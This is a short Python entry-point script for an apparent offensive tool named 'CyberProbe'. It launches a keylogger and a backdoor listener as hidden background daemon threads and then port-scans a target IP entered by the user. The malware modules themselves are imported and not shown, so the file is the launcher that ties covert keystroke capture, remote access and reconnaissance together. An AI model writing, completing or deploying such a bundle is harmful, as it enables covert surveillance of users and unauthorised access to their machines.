import threading
from keylogger import start_keylogger
from port_scanner import scan_ports
from backdoor import start_backdoor

if __name__ == "__main__":
    print("Starting CyberProbe...")

    # Start Keylogger in backgroud
    keylogger_thread = threading.Thread(target = start_keylogger, daemon = True)
    keylogger_thread.start()
    print("[*] Keylogger started...")

    #Start Backdoor in background
    backdoor_thread =threading.Thread(target = start_backdoor, daemon = True)
    backdoor_thread.start()
    print("[*] Backdoor listener started...")

    #Run port scanner once
    target = input("Enter target IP to scan: ")
    open_ports = scan_ports(target)
    print(f"[+] Open ports: {open_ports}")

    while True:
        pass